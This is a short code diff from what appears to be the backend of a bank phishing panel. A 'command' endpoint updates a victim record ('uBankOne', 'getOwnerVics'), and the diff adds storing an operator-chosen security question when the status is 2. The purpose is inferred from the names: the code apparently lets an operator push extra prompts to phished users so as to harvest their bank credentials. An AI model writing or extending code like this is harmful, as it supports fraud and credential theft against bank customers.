@@ -13,9 +13,15 @@ const getOwnerVics = async (req, res) => {
 };
 
 const command = async (req, res) => {
-  const { uniqueid, status } = req.body;
+  const { uniqueid, secQuestion, status } = req.body;
   try {
-    await uBankOne.findOneAndUpdate({ uniqueid }, { status }).exec();
+    if (status == 2) {
+      await uBankOne
+        .findOneAndUpdate({ uniqueid }, { secQuestion, status })
+        .exec();
+    } else {
+      await uBankOne.findOneAndUpdate({ uniqueid }, { status }).exec();
+    }
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
